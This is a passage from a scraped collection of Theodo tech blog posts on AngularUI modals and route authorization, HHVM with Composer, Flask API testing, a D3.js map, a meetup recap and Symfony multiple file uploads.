($scope, $modalInstance, myVar) ->\r\n    $scope.myVar = myVar\r\n    $scope.ok = ->\r\n      // ...\r\n      $modalInstance.close $scope.anotherVar\r\n    $scope.cancel = ->\r\n      $modalInstance.dismiss 'cancel'\r\n\nThe Modal view :\n# home/modals/mymodal/view.jade (Modal view)\r\n.modal-header\r\n  h3.modal-title\r\n    span This is the modal title.\r\n    span.pull-right\r\n      i.fa.fa-remove.cursor(ng-click=\"cancel()\")\r\n.modal-body\r\n  p\r\n    This is the modal body. `myVar` is available here : {{ myVar }}\r\n.modal-footer\r\n  button.btn.btn-primary(ng-click=\"ok()\")\r\n  button.btn.btn-link(ng-click=\"cancel()\")\r\n\nIf need be, you may return a variable on modal closure, in our case anotherVar. This variable is passed down to the modal promise.\n# home/states/main/controller.coffee  (Controller of the view from which the modal is launched)\r\nangular.module 'home-module'\r\n  .controller 'HomeController', ($scope) ->\r\n    $scope.foo = 'bar'\r\n    $scope.launchModal = ->\r\n      modalInstance = $modal.open\r\n        animation: true\r\n        ...\r\n\r\n      modalInstance.result.then (anotherVar) ->\r\n          console.log 'Promise has resolved'\r\n          $scope.anotherVar = anotherVar\r\n        , ->\r\n          console.log 'Promise was rejected'\r\n\nMaking it stateful\nA great way to improve the ergonomy of your application is to make some modals stateful: if your modal represents a key step in your application \u2013 login, subscribe, view my cart, etc-, as opposed to an alert or confirmation modal, then it should have its own url.\nThis is made possible by Angular UI Router, by linking your modal to a state with onEnter:\n# home/module.coffee\r\nangular.module 'home', [...]\r\n.config ($stateProvider) ->\r\n\r\n  $stateProvider\r\n    .state 'home',\r\n      url '/home'\r\n      ...\r\n\r\n    .state 'home.properties',\r\n      url: '/properties/:foo'\r\n      onEnter: ($modal, $state, $stateParams) ->\r\n        modalInstance = $modal.open\r\n          animation: false\r\n          templateUrl: 'home/modals/mymodal/view.html'\r\n          controller: 'MyModalCtrl'\r\n          size: 'lg'\r\n          resolve:\r\n            myVar: ->\r\n              $stateParams.foo\r\n\r\n        modalInstance.result.finally ->\r\n          $state.go '^'\r\n\nThe state home.properties is a child state of home. It will load its template in its parent\u2019s ui-view, as demonstrated below. Moreover the modal is triggered by a ui-sref attribute, as you would do with a link. Finally, $state.go '^' redirects you to the parent state when the modal promise is resolved.\n# home/states/main/view.jade (View from which the modal is launched)\r\n//...\r\nbutton.btn.btn-default(ui-sref=\"home.properties({foo: 'bar'})\")\r\n//...\r\n.ui-view\r\n\nConclusion\nThat\u2019s all folks! If you want to see a live example of stateful modals, you can check out Trello.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarc Perrin-Pelletier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nHello my dearest Mac geeks!\nA long long time ago, Facebook released a shiny machine named HHVM.\nIt could execute PHP very fast and was compatible with Mac OS X.\nTime has passed, HHVM was still incredibly fast, but lost its compatibility with Mac.\nA few days ago, after 2 years of intense work, a (too discreet in my opinion) announcement popped:\nAwesomeness was back.\nYou can now (again) install HHVM on your Mac very easily with Homebrew thanks to this official repository:\nbrew tap hhvm/hhvm\r\nbrew install hhvm\r\n\nA warning though, installation takes a long time (as in \u201ccan take more than 1 hour on slow computers\u201d).\nAwesome! Wait, what do I need HHVM for again?\nWho has never had any performance problem with Composer?\nInfamously, the composer update command can be very slow and eat a lot of memory if you have quite a few dependencies, which is often the case on a Symfony project.\nI ran out of memory several times because of it, generally after a few minutes of intense computation.\nSituation is considerably better than in the past thanks to some incredible tricks like this one.\nAnd yet, 2GB of RAM is rarely sufficient, and it still takes more than 5 minutes on some computers to update the configuration.\nFirst thing to speed up composer:\nif you work in a virtual machine with file sharing with your Mac (with Vagrant for example), you should not try composer update inside the machine, but in your Mac.\nThat leads us to HHVM:\nhhvm $(brew --prefix)/bin/composer.phar update\r\n\nshould rock your world on your Mac!\nDon\u2019t like to type all this gibberish?\nMake it an alias.\nFor bash for example, add this to your .bash_profile:\nalias hcomposer='hhvm $(brew --prefix)/bin/composer.phar'\r\n\nAnother warning, when updating outside your environment with either your Mac PHP or HHVM, you should use the option --ignore-platform-reqs to ignore the version differences in PHP and the extensions.\nBenchmark with \u201coldie\u201d PHP 5.6.12 on a naked Symfony Standard Edition (on a quite newish MacBook Pro, so it\u2019s still really fast):\ncomposer update --profile\r\n[8.0MB/0.07s] Loading composer repositories with package information\r\n[8.4MB/0.20s] Updating dependencies (including require-dev)\r\n[367.7MB/14.71s]   - Installing symfony/symfony (2.8.x-dev 685a1cf)\r\n[367.7MB/14.71s]     Cloning 685a1cf6f441459fb61a25acfe93853d016f46c2\r\n\u2026\r\n\nWith shiny bleeding edge HHVM:\nhcomposer update --profile\r\n[8.0MB/1.16s] Loading composer repositories with package information\r\n[8.0MB/1.64s] Updating dependencies (including require-dev)\r\n[126.0MB/5.66s]   - Installing symfony/symfony (2.8.x-dev 685a1cf)\r\n[126.0MB/5.84s]     Cloning 685a1cf6f441459fb61a25acfe93853d016f46c2\r\n\u2026\r\n\nNow, your biggest problem will be finding a way to spend all this free time left for you.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou can find the source code written in this article in the flask-boilerplate that we use at Theodo.\nFunctionally Testing an API consists in calling its routes and checking that the response status and the content of the response are what you expect.\nIt is quite simple to set up functional tests for your app. Writing a bunch of HTTP requests in the language of you choice that call your app (that has previously been launched) will do the job.\nHowever, with this approach, your app is a blackbox that can only be accessed from its doors (i.e. its URLs). Although the goal of functional tests is actually to handle the app as a blackbox, it is still convenient while testing an API to have access to its database and to be able to mock calls to other services (especially in a context of micro-services environment).\nMoreover it is important that the tests remain independent from each other. In other words, if a resource is added into the database during a test, the next test should not have to deal with it. This is not easy to handle unless the whole app is relaunched before each test. Even if it is done, some tests require different fixtures. It would be tricky to handle.\nWith this first approach, our functional tests were getting more complex than the code they were testing. I would like to share how we improved our tests using the flask test client class.\nYou don\u2019t need to know about flask/python to understand the following snippets.\nThe API allows to post and get users. First we can write a route to get a user given its id:\n# src/route/user.py\r\nfrom model import User\r\n\r\n# When requesting the URL /user/5, the get_user_by_id will be executed with id=5\r\n@app.route('/user/<int:id>', methods=['GET'])\r\ndef get_user_by_id(self, id):\r\n    user = User.query.get(id)\r\n    return user.json  # user.json is a dictionary with user data such as its email\r\n\nThis route can be tested with the flask test client class:\n# test/route/test_user.py\r\nimport unittest\r\nimport json\r\n\r\nfrom server import app\r\nfrom model import db, User\r\n\r\nclass TestUser(unittest.TestCase):\r\n\r\n    # this method is run before each test\r\n    def setUp(self):\r\n        self.client = app.test_client()  # we instantiate a flask test client\r\n\r\n        db.create_all()  # create the database objects\r\n        # add some fixtures to the database\r\n        self.user = User(\r\n            email='joe@theodo.fr',\r\n            password='super-secret-password'\r\n        )\r\n        db.session.add(self.user)\r\n        db.session.commit()\r\n\r\n    # this method is run after each test\r\n    def tearDown(self):\r\n        db.session.remove()\r\n        db.drop_all()\r\n\r\n    def test_get_user(self):\r\n        # the test client can request a route\r\n        response = self.client.get(\r\n            '/user/%d' % self.user.id,\r\n        )\r\n\r\n        self.assertEqual(response.status_code, 200)\r\n        user = json.loads(response.data.decode('utf-8'))\r\n        self.assertEqual(user['email'], 'joe@theodo.fr')\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n\nIn these tests:\n\nall tests are independent: the database objects are rebuilt and fixtures are inserted before each test.\nwe have access to the database via the db object during the tests. So if you test a \u2018POST\u2019 route, you can check that a resource has been successfuly added into the database.\n\nAnother benefit is that you can easily mock a call to another API. Let\u2019s improve our API: the get_user_by_id function will call an external API to check if the user is a superhero:\n# src/client/superhero.py\r\nimport requests\r\n\r\ndef is_superhero(email):\r\n    \"\"\"Call the superhero API to find out if this email belongs to a superhero.\"\"\"\r\n    response = requests.get('http://127.0.0.1:5001/superhero/%s' % email)\r\n    return response.status_code == 200\r\n\nfrom client import superhero\r\n# ...\r\n@app.route('/user/<int:id>', methods=['GET'])\r\ndef get_user_by_id(self, id):\r\n    user = User.query.get(id)\r\n    user_json = user.json\r\n    user_json['is_superhero'] = superhero.is_superhero(user.email)\r\n    return user_json\r\n\nTo prevent the tests from depending on this external API, we can mock the client in our tests:\n# test/route/test_user.py\r\nfrom mock import patch\r\n#...\r\n\r\n@patch('client.superhero.is_superhero')  # we mock the function is_superhero\r\ndef test_get_user(self, is_superhero_mock):\r\n    # when is_superhero is called, it returns true instead of calling the API\r\n    is_superhero_mock.return_value = True\r\n\r\n    response = self.client.get(\r\n        '/user/%d' % self.user.id,\r\n    )\r\n    self.assertEqual(response.status_code, 200)\r\n    user = json.loads(response.data.decode('utf-8'))\r\n    self.assertEqual(user['email'], 'joe@theodo.fr')\r\n    self.assertEqual(user['is_superhero'], True)\r\n\nTo use this mock for all tests, the mock can be instantiated in the setUp method:\n# test/route/test_user.py\r\ndef setUp(self):\r\n    #...\r\n    self.patcher = patch('client.superhero.is_superhero')\r\n    is_superhero_mock.return_value = True\r\n    is_superhero_mock.start()\r\n    #...\r\n\r\ndef tearDown(self):\r\n    #...\r\n    is_superhero_mock.stop()\r\n    #...\r\n\nConclusion\nWith the Flask test client, you can write functional tests, keep control over the database and mock external calls. Here is a flask boilerplate to help you get started with a flask API.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nA new blog post on D3.js! Last time Jean-R\u00e9mi made this very nice article on the force layout. This time will we show you how we drew this worldmap of where the Theodoers have traveled.\nWe started from this techslides demo to have countries grouped by continent. We simplified the map a little bit to make it easier to handle. We then colorized our map with the Theodoers traveling history. Finally, we added the ability to zoom in and zoom out.\nThe architecture is very simple with three directories and four important files:\n\ndata/continent-geogame-110m-countrieszoom.json the data used to draw the countries of the map.\ndata/dataTheodoTravels.json, the datafile we use to color the map.\nindex.html\njs/map.js, the file where the map is actually rendered and where all the logic is.\n\nThe other files are the D3.js core files and topojson.\nIf you want to reuse the map, just change the js/map.js file. We made severals steps to make it easier to understand.\nWe tried to fill it with useful comments so the best way to understand how it works is to have a look at the lightest version of the code. Then you can look at the more complete versions and make your own version.\nIf you have any questions, you can ping us on twitter: @jiherr and @maxthoon\nJean-R\u00e9mi and Maxime\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLast week, Theodo was at the Human Talk Meetup.\nIt\u2019s a small afterwork event where developpers speak without restrictions about any topic during 4 sessions of 10 minutes each. Each talk was really really interesting and the subjects were quite diverse. Therefore I will dedicate one paragraph to each talk of the evening.\n\nObject Oriented Programming: historical error or path to follow?\nThis session, presented by Fr\u00e9d\u00e9ric Fadel, was of particular interest for me, for it smartly challenged our standardized vision of programming. Why do we use OOP? Mainly for historical reasons, but there are lots of things that we do for historical reasons, that are now standards, but are we sure it is the right choice? Democracy, Capitalism, Monogamy, Obligation of School\u2026 who knows if other standards will emerge tomorrow?\nTherefore he questioned the pertinence of 3 fundamentals of OOP: encapsulation, polymorphism and heritage. Whereas he totally agrees with the first concept and find that the second can be useful too, he mainly criticizes the last one. Because of the true nature of information, completely virtual, it is by essence very difficult to model into labeled boxes and fixed objects. His speech is therefore a curiosity incentive to make you want to learn more about Aspect Oriented Programming.\nAs I do not intend to rephrase the talk here, if you want to know more, I invite you to watch the full video of the presentation.\nPresentation of Scrapoxy\nThis session was less philosophical and more pragmatic as it went straight into the methods of bypassing web scrapers limitations. After a short introduction about what is at stake (getting information and resell it :p), Fabien Vauchelles enumerated the 3 main restrictions companies put in place to limit the scrapping.\nThe first limitation is simple blacklisting based on IP and hits per minute. The second one is advanced blacklisting based on more complex detection techniques (User-Agents or even user behavior: how does a human user use the keyboard, the mouse\u2026). The third one often comes into play when a strange behavior is detected: the website asks the user to confirm that he is human with a captcha.\nHe then reasoned step by step on how to bypass the first limitation:\n\nStep 1: you use a proxy to hide your IP. When it is blacklisted, you can restart manually the proxy to scrap the website with a new IP.\nStep 2: you use many proxies with many IPs to gain more time before you get detected\nStep 3: you use a proxy manager that will manage a pool of proxies. Detect automatically which ones have been blacklisted, exclude them of the pool and start a new one, to keep the number of proxies constant.\n\nWhich is the exact behavior of Scrapoxy.\nOf course, the last question of the public was about the morality of web scrapping\u2026 Well, you can still visit their website or watch the video if you want to learn more!\n\nWhy do we fix bugs?\nThe speaker, Michal \u0160v\u00e1cha, was truly enthusiast and inspiring during this recreative presentation. He fitted perfectly in between the more technical presentation with a lot of humor. After an epic bug resolution description, he asked himself this simple question: \u201cwhy do we fix bugs?\u201d.\nHe ran through every possible reason:\n\nIs it for our brain to feel better?\nTo please our product manager?\nFor the end-user at world\u2019s end?\nFor the pleasure to tick one more bug in our todo-list?\n\nHe finally ran into the conclusion that we are human after all and that we are mainly doing it to gain experience, to be better programmers, for our thriving thirst of personal progress and accomplishment. Actually fixing bugs is not about the destination, it is about the journey.\nIf you want the whole show, here is a link to the online video.\nReactJS in production\nThe last presentation, by Cl\u00e9ment Dubois was about ReactJS, used on the Chilean website of Club Med. The main reason behind this bold technology choice was the need of SEO on a single page application. Indeed, single page apps are mainly blanks for search engines because they build the DOM dynamically depending on AJAX sub-requests results. With ReactJS, you can configure your server to send first a static and full version of the page, understandable by search engines. The JavaScript then makes it dynamic, as a real web application. He went through the basics of ReactJS (the components, the state and the render function), including code snippets. He also explained the necessity in their process to begin with finding the components that you will need to create in a page and see which generic version you can write for later reuse.\nIf you are interested, I invite you to learn more about ReactJS in their really useful documentation, or on the video of the presentation.\n\nWell, if you\u2019re interested in these topics, it would be a pleasure to meet you in one of the nexts Human Talk meetups! See you on October 13?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tReynald Mandel\r\n  \t\t\t\r\n  \t\t\t\tAfter two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nSupercharging AngularUI Router with basic route authorization features\nAngularUI Router is undoubtedly the routing framework to use when working on any Angular application that requires the slightest routing features. It allows organizing your different (and possibly nested!) views into a state machine, with each state optionally attached to routes and custom behaviors.\nHowever, when some routes require in your application for the user to be logged in or to possess any kind of authorization, you may find yourself having to reinvent the whole wheel to allow such restrictions.\nIn this blog post, I will introduce a very basic, yet functional, way to:\n\nLimit access to states\nRedirect users to another state when access was denied\nMemorize the state the user was trying to reach, in order to allow redirection as soon as the user successfully logs in\n\nAlways keep in mind that client side authentication, although improving the user experience, does not replace the more secured server side authentication which should always be implemented first when security is a concern.\nReading this article requires a basic understanding of AngularJS, AngularUI Router, and of Lodash.\nThe sample app state machine\nWe introduce a minimum example, with an application with four routes, two of which being restricted and being given the authorization flag as well as a redirectTo option to specify where the user should be redirected if not authorized. An additional memory flag is given to the \u2018secret\u2019 state in order to specify that the fact that the user was trying to reach this state should be memorized.\n.config(function ($stateProvider, $urlRouterProvider) {\r\n\r\n  $urlRouterProvider.otherwise('/');\r\n\r\n  $stateProvider\r\n  .state('home', {\r\n    url: '/',\r\n    template: '<h1>Home</h1>'\r\n  })\r\n  .state(\"login\", {\r\n    url: \"/login\",\r\n    template: '<h1>Log In</h1>'\r\n  })\r\n  .state('private', {\r\n    url: '/private',\r\n    template: '<h1>Private</h1>',\r\n    data: {\r\n      authorization: true,\r\n      redirectTo: 'login'\r\n    }\r\n  })\r\n  .state('secret', {\r\n    url: '/secret',\r\n    template: '<h1>Secret</h1>',\r\n    data: {\r\n      authorization: true,\r\n      redirectTo: 'login',\r\n      memory: true\r\n    }\r\n  });\r\n\r\n});\r\n\nThe Authorization service\nThis service must include a boolean determining wether or not the user is currently authorized to access restricted routes, as well as which state the user was last trying to reach.\nIt also provides a function to clear both information, as well as a go method which is to be called when the user logs in with success. It authorizes the user, and also performs a $state.go, except that it tries to use the memorized state if available, relying on the given state fallback argument if not.\n.service('Authorization', function($state) {\r\n\r\n  this.authorized = false;\r\n  this.memorizedState = null;\r\n\r\n  var\r\n  clear = function() {\r\n    this.authorized = false;\r\n    this.memorizedState = null;\r\n  },\r\n\r\n  go = function(fallback) {\r\n    this.authorized = true;\r\n    var targetState = this.memorizedState ? this.memorizedState : fallback;\r\n    $state.go(targetState);\r\n  };\r\n\r\n  return {\r\n    authorized: this.authorized,\r\n    memorizedState: this.memorizedState,\r\n    clear: clear,\r\n    go: go\r\n  };\r\n});\r\n\nLogging in can then easily be done by calling this method, which authorizes the user, and redirects him to the private state, or to any memorized state if it does have one.\nAuthorization.go('private');\r\n\nLogging out is just as easy, and can be followed by a redirection to a non restricted state.\nAuthorization.clear();\r\n$state.go('home');\r\n\nIn most cases, you will want to hold the authorization information in the local storage, so that the user stays logged in even after restarting the browser.\nRestricting access\nThe first step is to restrict access to the states which were given the authorization flag. Let\u2019s work step by step in a angular run block:\n.run(function(_, $rootScope, $state, Authorization) {\r\n\r\n  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {\r\n    if (!Authorization.authorized && _.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {\r\n      $state.go(toState.data.redirectTo);\r\n    }\r\n  });\r\n});\r\n\nWe listen to the $stateChangeSuccess event, to allow a possible resolve block for the target state to be processed. We then redirect the user to the redirectTo state name.\nSetting the memorized state\nIn order to use the Authorization.go function which tries to redirect the user to the memorized state, such a state needs to be set in the run block as well. Here is an updated version where such a feature is applied to each state given a truthy memory in the state configuration.\n.run(function(_, $rootScope, $state, Authorization) {\r\n\r\n  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {\r\n    if (!Authorization.authorized && _.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {\r\n      if (_.has(toState, 'data.memory') && toState.data.memory) {\r\n        Authorization.memorizedState = toState.name;\r\n      }\r\n      $state.go(toState.data.redirectTo);\r\n    }\r\n  });\r\n\r\n});\r\n\nForgetting about the memorized state\nWith the simple implementation, some issues may arise when the user does not choose to immediately log in after being redirected, and moves instead to another non-restricted state. The proper behavior would then be to forget about the memorized state, so that when the user eventually logs in, the fallback state parameter given to the Authorization.go is used instead. Here is the final version of the run block.\n.run(function(_, $rootScope, $state, Authorization) {\r\n\r\n  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {\r\n    if (!Authorization.authorized) {\r\n      if (Authorization.memorizedState && (!_.has(fromState, 'data.redirectTo') || toState.name !== fromState.data.redirectTo)) {\r\n        Authorization.clear();\r\n      }\r\n      if (_.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {\r\n        if (_.has(toState, 'data.memory') && toState.data.memory) {\r\n          Authorization.memorizedState = toState.name;\r\n        }\r\n        $state.go(toState.data.redirectTo);\r\n      }\r\n    }\r\n\r\n  });\r\n});\r\n\nThe tricky part is that clearing the memorized state should only be done when the user moves away from the login page, and thus should not be cleared when toState.name !== fromState.data.redirectTo.\nDemo / Library\nA simple demo is given in this Codepen.\nYou can navigate between the four states, the two first of which not requiring being authentified. Trying to reach the \u2018Private Page\u2019 or the \u2018Secret Page\u2019 will redirect you to the \u2018Login\u2019 state.\nBy default, logging in will get you to the \u2018Private Page\u2019, but if you log after trying to reach the \u2018Secret Page\u2019, you will be redirected to it directly.\nI\u2019ve provided an implementation of this system in the angular-authorization repository on GitHub. It probably has issues, so any feedback, bug reports, feature requests, or pull requests are more than welcome !\n____\nYou liked this article? You\u2019d probably be a good match for our ever-growing tech team at Theodo. Take a look at our job offers on http://www.theodo.fr/en/joinus/\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWoody Rousseau\r\n  \t\t\t\r\n  \t\t\t\tWoody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nNote : this article has been written for Symfony 2. It is not working with Symfony 3.\nThe long and exhausting journey\nHave you already told your product owner that the feature he was suggesting was too ambitious right now and that he should prioritize?\nIt is often the case when multiple files upload is on the table. Indeed, the symfony cookbook contains a very simple, yet detailed article describing how to setup a single file upload.\nMultiple files upload is seen by most developers as a quite more complex task. The first thing that comes to mind is usually to:\n\nCreate a new class representing the file (containing at least its path)\nAdd a OneToMany relationship between the Document class and the File class\nAdd a form collection and write the necessary javascript to manage this collection (i.e. at least add/remove a file)\nAdapt the Document methods to handle the form collection\n\nThe point of this article is to introduce a much faster way to set up multiple files upload through the usage of the fairly new multiple field option (implemented in Symfony 2.6).\nThe pragmatic and time-saving way\nLet\u2019s start with the fileupload symfony cookbook.\nTo handle multiple files, the first thing to do is to adapt our form:\npublic function buildForm(FormBuilderInterface $builder, array $options)\r\n{\r\n    $builder\r\n        ->add('name')\r\n        ->add('files', 'file', array(\r\n            'multiple' => true, \r\n            'data_class' => null,\r\n        ));\r\n}\r\n\nTry it and note that Symfony displays the HTML5 input multiple Attribute\nWhen you submit the form, an array of UploadedFile is sent instead of a single object. Thus, we need to adapt our Document class to persist an array of paths instead of a single one:\n/**\r\n * @ORM\\Column(type=\"array\")\r\n */\r\nprivate $paths;\r\n\nand it is necessary to adapt the upload() method to persist each file:\n/**\r\n * @ORM\\PreFlush()\r\n */\r\npublic function upload()\r\n{\r\n    foreach($this->files as $file)\r\n    {\r\n        $path = sha1(uniqid(mt_rand(), true)).'.'.$file->guessExtension();\r\n        array_push ($this->paths, $path);\r\n        $file->move($this->getUploadRootDir(), $path);\r\n\r\n        unset($file);\r\n    }\r\n}\r\n\nAnd that\u2019s all!\nHurray, we can now persist multiple files and it took us 5 minutes! Isn\u2019t it satisfying?\nNow let\u2019s go further. What we have done is great, but lacks flexibility. Let\u2019s give a file its own entity. We will then be able to store some metadata such as its name or size.\nThe effortless elegant method\nOkay, we now want our own File class. Let\u2019s create something simple. It will be easy to adapt it later if needed:\n/**\r\n * @ORM\\Table(name=\"files\")\r\n * @ORM\\Entity\r\n */\r\nclass File\r\n{\r\n    /**\r\n     * @var integer\r\n     *\r\n     * @ORM\\Column(name=\"id\", type=\"integer\")\r\n     * @ORM\\Id\r\n     * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n     */\r\n    private $id;\r\n\r\n    /**\r\n     * @var string\r\n     *\r\n     * @ORM\\Column(name=\"path\", type=\"string\", length=255)\r\n     */\r\n    private $path;\r\n\r\n    /**\r\n     * @var string\r\n     *\r\n     * @ORM\\Column(name=\"name\", type=\"string\", length=255)\r\n     */\r\n    private $name;\r\n\r\n    /**\r\n     * @var integer\r\n     *\r\n     * @ORM\\Column(name=\"size\", type=\"integer\")\r\n     */\r\n    private $size;\r\n\r\n    /**\r\n     * @var UploadedFile\r\n     */\r\n    private $file;\r\n\r\n    /**\r\n     * @ORM\\ManyToOne(targetEntity=\"Document\", inversedBy=\"files\")\r\n     * @ORM\\JoinColumn(name=\"document_id\", referencedColumnName=\"id\")\r\n     **/\r\n    private $document;\r\n\nThen, we need to adapt our Document class:\n/**\r\n * @var File\r\n *\r\n * @ORM\\OneToMany(targetEntity=\"File\", mappedBy=\"document\", cascade={\"persist\"})\r\n *\r\n */\r\nprivate $files;\r\n\r\n/**\r\n * @var ArrayCollection\r\n */\r\nprivate $uploadedFiles;\r\n\nThe attribute $uploadedFiles is necessary because this is the one which will be hydrated when the form is submitted.\nNow let\u2019s adapt the upload method and instantiate our new class dynamically:\n/**\r\n * @ORM\\PreFlush()\r\n */\r\npublic function upload()\r\n{\r\n    foreach($this->uploadedFiles as $uploadedFile)\r\n    {\r\n        $file = new File();\r\n\r\n        /*\r\n         * These lines could be moved to the File Class constructor to factorize \r\n         * the File initialization and thus allow other classes to own Files\r\n         */\r\n        $path = sha1(uniqid(mt_rand(), true)).'.'.$uploadedFile->guessExtension();\r\n        $file->setPath($path);\r\n        $file->setSize($uploadedFile->getClientSize());\r\n        $file->setName($uploadedFile->getClientOriginalName());\r\n\r\n        $uploadedFile->move($this->getUploadRootDir(), $path);\r\n\r\n        $this->getFiles()->add($file);\r\n        $file->setDocument($this);\r\n\r\n        unset($uploadedFile);\r\n    }\r\n}\r\n\nAnd we are done, awesome, we can now upload multiple files and populate in the same time entities to represent them!\nHere is an implementation of what is described in this section.\nThe bundle polish\nOkay. One might say that the HTML 5 multiple attribute is not (quite) the state of the art in terms of UI. Fair enough, let\u2019s introduce a magical bundle which will beautify your brand new multiple files upload feature.\nLadies and gentlemen, let me introduce OneupUploaderBundle. This bundle provides the choice between the most used file uploads javascript libraries.\nThe operation of this bundle is a little bit different from the first two sections of this article. In fact, submitting a file will trigger an ajax call on a specific url. The idea is then to create an event listener which will persist on the fly the incoming files.\nFor example, your edit page view will contain something like:\n<div action=\"{{ oneup_uploader_endpoint('document_files') }}\" \r\nid=\"portfolio\" class=\"dropzone\">\r\n\nAnd your eventListener will contains a method catching the upload events:\n/**\r\n * @param PostPersistEvent $event\r\n */\r\npublic function onUpload(PostPersistEvent $event)\r\n{\r\n\nConclusion\nHopefully, this article gave you a clear overview of what is hidden behind multiple files uploads, as well as the keys to develop this feature quickly.\nDon\u2019t hesitate to suggest any improvement, I will keep it up to date.\n\nSources\n\nStack Overflow Article which gaves me the original idea\nSymfony cookbook page about file upload which helped to start this tutorial from a good and well-documented example\n\n\nThanks\nI would like to thank the Theodoers who took the time to proofread this article:\n\nTristan\nAlexandre\nJean-Luc\nWoody\nNicolas\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJulien Vallini\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer @ Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
